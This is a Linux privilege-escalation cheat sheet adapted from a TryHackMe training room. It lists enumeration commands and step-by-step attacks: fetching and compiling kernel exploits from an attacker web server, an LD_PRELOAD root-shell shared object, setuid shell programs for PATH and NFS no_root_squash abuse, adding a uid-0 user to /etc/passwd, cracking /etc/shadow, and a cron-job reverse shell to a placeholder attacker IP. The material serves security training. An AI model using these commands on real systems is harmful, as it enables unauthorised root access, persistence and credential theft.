
`This document outlines common techniques and commands used for privilege escalation on Linux systems.` 

*source*: https://tryhackme.com/room/linprivesc


---

## 1. Enumeration

Initial information gathering is crucial.

*   **Hostname:** Check the machine's hostname.
    ```bash
    hostname
    ```
*   **Kernel/OS Info:** Get details about the kernel and operating system.
    ```bash
    uname -a
    cat /proc/version
    cat /etc/issue
    ```
*   **Running Processes:** See what processes are currently running.
    *   `ps -A`: View all running processes.
    *   `ps axjf`: View process tree (shows parent-child relationships).
    *   `ps aux`: View all processes running by all users, including details.
*   **Environment Variables:** Check environment variables, might contain sensitive info.
    ```bash
    env
    ```
*   **Sudo Permissions:** List commands the current user can run with `sudo`.
    ```bash
    sudo -l
    ```
*   **User/Group Info:** Get an overview of the current user's privilege level and group membership. Can also check for other users.
    ```bash
    id
    id <username>
    ```
*   **Users List:** Check the list of users on the system.
    ```bash
    cat /etc/passwd
    ```
*   **Command History:** Review command history for potentially leaked passwords, usernames, or system details.
    ```bash
    history
    ```
*   **Networking:** Check network configuration and connections.
    ```bash
    # Interface configuration
    ifconfig
    ip addr

    # Routing table
    ip route

    # Network connections and listening ports
    netstat -a    # All listening ports and established connections
    netstat -at   # TCP only
    netstat -au   # UDP only
    netstat -l    # Listening ports only
    netstat -lt   # Listening TCP ports
    netstat -s    # Network statistics by protocol
    netstat -tp   # Connections with service name and PID
    netstat -i    # Interface statistics
    netstat -ano  # Common combination: All, numeric hosts/ports, timers
    ss -tulpn     # Modern alternative to netstat
    ```
*   **File Search (`find`):** Locate specific files or files with certain properties.
    *   Find specific file: `find . -name flag1.txt`
    *   Find directory by name: `find / -type d -name config`
    *   Find world-writable files: `find / -type f -perm 0777`
    *   Find executable files: `find / -perm a=x`
    *   Find files owned by user 'frank': `find /home -user frank`
    *   Find files modified in last 10 days: `find / -mtime 10`
    *   Find files accessed in last 10 days: `find / -atime 10`
    *   Find files changed in last 60 minutes: `find / -cmin -60`
    *   Find development tools/languages: `find / -name python\*` `find / -name gcc\*`
    *   **Find SUID files (Critical for PrivEsc):**
        ```bash
        find / -perm -u=s -type f 2>/dev/null
        ```
    *   **Find SGID files (Critical for PrivEsc):**
        ```bash
        find / -perm -g=s -type f 2>/dev/null
        ```

---

## 2. Kernel Exploits

Exploiting vulnerabilities in the Linux kernel itself. **Caution:** Can be unstable and crash the system.

### Methodology

1.  **Identify Kernel Version:** Use `uname -a` or `cat /proc/version`.
2.  **Search for Exploit:** Use tools like `searchsploit` or online resources (Exploit-DB) to find a known exploit for the specific kernel version.
3.  **Transfer & Compile:**
    *   Start a web server on your attacker machine in the directory containing the exploit code (e.g., `exploit.c`):
        ```bash
        python3 -m http.server 8000
        ```
    *   On the target machine, download the exploit (usually to `/tmp`):
        ```bash
        cd /tmp
        wget http://<YOUR_ATTACKER_IP>:8000/exploit.c
        ```
    *   Compile the exploit code:
        ```bash
        gcc exploit.c -o exploit
        # Sometimes specific flags are needed, e.g., -pthread, -lcrypt
        ```
4.  **Run Exploit:**
    ```bash
    ./exploit
    ```

---

## 3. SUDO / Sudo Rights

Exploiting misconfigurations or intended `sudo` privileges.

*   **Check `sudo -l` first!**
*   **GTFOBins:** An invaluable resource for finding binaries that can be abused with `sudo` rights to get a shell or perform other actions.
    *   [https://gtfobins.github.io/](https://gtfobins.github.io/)

### LD_PRELOAD Technique

If `sudo -l` shows a program can be run *and* the `env_keep+=LD_PRELOAD` option is set, you can hijack the execution flow.

1.  **Check:** Verify `LD_PRELOAD` is kept via `sudo -l`.
2.  **Create Shared Object:** Write C code to spawn a shell (`shell.c`):
    ```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    // This function is executed before main() when the object is loaded
    void _init() {
        unsetenv("LD_PRELOAD"); // Clean up environment variable
        setgid(0);              // Set group ID to root
        setuid(0);              // Set user ID to root
        system("/bin/bash -p"); // Spawn root shell (-p preserves privileges)
    }
    ```
3.  **Compile:** Compile the C code into a shared object (`.so` file):
    ```bash
    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    ```
4.  **Execute:** Run the allowed `sudo` command, forcing it to load your malicious shared object:
    ```bash
    sudo LD_PRELOAD=/path/to/your/shell.so <program_allowed_by_sudo>
    # Example: sudo LD_PRELOAD=/home/user/shell.so /usr/sbin/apache2
    ```

---

## 4. SUID / GUID Exploitation

Binaries with the SUID (Set User ID) or GUID (Set Group ID) bit run with the permissions of the file owner (often root) or group, not the user running them.

*   **Find SUID/GUID binaries:**
    ```bash
    find / -type f -perm -04000 -ls 2>/dev/null # Find SUID
    find / -type f -perm -02000 -ls 2>/dev/null # Find SGID
    ```
*   **Check GTFOBins:** Look up any non-standard SUID/GUID binaries found on GTFOBins for known exploitation methods.
*   **Common Exploitable Binaries (Examples):**
    *   `nmap` (older versions)
    *   `find`
    *   `vim` / `vi`
    *   `bash`
    *   `cp`, `mv`
    *   `pkexec` (CVE-2021-4034 - PwnKit)
*   **Exploiting `/etc/passwd` write access (if SUID binary allows file write):**
    1.  Read `/etc/passwd` and `/etc/shadow` (if possible).
    2.  Use `unshadow` to create a file crackable by John the Ripper:
        ```bash
        unshadow passwd.txt shadow.txt > passwords.txt
        john passwords.txt
        ```
    3.  *Alternatively, add a new root user:*
        *   Generate password hash (e.g., for password 'password123'):
            ```bash
            openssl passwd -1 -salt <somesalt> password123
            # Example output: $1$<somesalt>$b6IHGL0QQkaQn/hYpMAjm/
            ```
        *   Craft a new line for `/etc/passwd` (username: `newroot`, uid: `0`, gid: `0`):
            `newroot:$1$<somesalt>$b6IHGL0QQkaQn/hYpMAjm/:0:0:root:/root:/bin/bash`
        *   Use the SUID binary to append this line to `/etc/passwd`.
        *   Switch to the new user: `su newroot`

---

## 5. Capabilities

Linux capabilities provide fine-grained privileges, allowing programs to perform specific privileged actions without full root access. Sometimes these can be abused.

*   **List Capabilities:**
    ```bash
    getcap -r / 2>/dev/null
    ```
*   **Check GTFOBins:** Look up binaries with interesting capabilities (like `cap_sys_admin`, `cap_setuid`, `cap_setgid`, `cap_dac_read_search`).

---

## 6. Cron Jobs

Scheduled tasks running as root (or other users) can sometimes be modified or exploit weak permissions.

*   **Check System-Wide Crontab:**
    ```bash
    cat /etc/crontab
    ls -l /etc/cron.* # Check permissions on directories/files
    ```
*   **Check User Crontabs:**
    ```bash
    ls -l /var/spool/cron/crontabs/
    cat /var/spool/cron/crontabs/root # If readable
    ```
*   **Exploitation:** If a script run by cron is world-writable or located in a world-writable directory (check PATH used by cron), you might be able to modify it or hijack its execution.
*   **Example Reverse Shell (if you can modify a script run by root's cron):**
    ```bash
    # Overwrite the script with:
    #!/bin/bash
    bash -i >& /dev/tcp/<YOUR_ATTACKER_IP>/<PORT> 0>&1
    ```
    *Ensure you have a listener (`nc -lvnp <PORT>`) running on your machine.*

---

## 7. PATH Exploitation

If a script or SUID binary runs a command without specifying its full path (e.g., `service apache2 start` instead of `/usr/sbin/service apache2 start`), and you can write to a directory listed *earlier* in the `$PATH` environment variable than the legitimate command's directory, you can hijack the execution.

1.  **Identify Writable Directories in PATH:**
    *   Check the PATH: `echo $PATH`
    *   Find world-writable directories:
        ```bash
        find / -writable 2>/dev/null
        # Better formatted output:
        find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
        ```
    *   Compare writable directories with the PATH order. `/tmp` is often writable and sometimes in PATH.
2.  **Create Malicious Script:** In a writable directory that's early in the PATH (e.g., `/tmp`), create a script named *exactly* the same as the command being called by the target script/binary (e.g., name it `service` if the target calls `service`).
    ```c
    // Example: malicious_script.c (compile to 'service')
    #include <unistd.h>
    #include <stdlib.h>

    void main() {
        setuid(0); // Try to become root
        setgid(0);
        system("/bin/bash -p"); // Spawn root shell
    }
    ```
    ```bash
    # Compile in /tmp
    cd /tmp
    gcc malicious_script.c -o service -w # Assuming target calls 'service'
    ```
3.  **Modify PATH (if needed):** Ensure your writable directory comes first.
    ```bash
    export PATH=/tmp:$PATH
    ```
4.  **Run the Target Script/SUID Binary:** When it tries to execute the command (e.g., `service`), it will find and run your malicious version in `/tmp` first.

---

## 8. NFS Exploitation (Network File System)

Misconfigured NFS shares can allow privilege escalation, especially if the `no_root_squash` option is enabled. This option means a root user on the client machine connects as root on the NFS server, instead of being "squashed" to the `nfsnobody` user.

1.  **Check NFS Configuration (on Target):**
    ```bash
    cat /etc/exports
    # Look for shares and the 'no_root_squash' option
    ```
2.  **Enumerate Shares (from Attacker Machine):**
    ```bash
    showmount -e <TARGET_IP>
    ```
3.  **Mount the Share (from Attacker Machine):**
    *   Create a mount point: `mkdir /tmp/nfsmount`
    *   Mount the share (assuming `/share` was exported from target):
        ```bash
        sudo mount -o rw <TARGET_IP>:/share /tmp/nfsmount
        # Use '-o vers=2' or '-o vers=3' if needed
        ```
4.  **Exploit `no_root_squash`:**
    *   Go into the mounted directory on your attacker machine: `cd /tmp/nfsmount`
    *   Create a C program (`nfs_exploit.c`) that will set UID to 0 and spawn a shell:
        ```c
        #include <unistd.h>
        #include <stdio.h>
        #include <stdlib.h>

        int main() {
            setuid(0); // Become root
            setgid(0);
            system("/bin/bash -p"); // Spawn shell
            return 0;
        }
        ```
    *   Compile it *on your attacker machine*:
        ```bash
        gcc nfs_exploit.c -o nfs_exploit -w
        ```
    *   Make it SUID *on your attacker machine* (requires root):
        ```bash
        sudo chown root:root nfs_exploit
        sudo chmod +s nfs_exploit
        ```
    *   Now, *on the target machine*, navigate to where the share is mounted (or the original export directory) and run the `nfs_exploit` binary you just created via the NFS mount. Since it has the SUID bit set and was created as root *via the NFS mount*, it should execute as root on the target system.
        ```bash
        # On Target Machine
        cd /share # Or wherever the share is mounted/exported
        ./nfs_exploit # This should give a root shell
        ```

---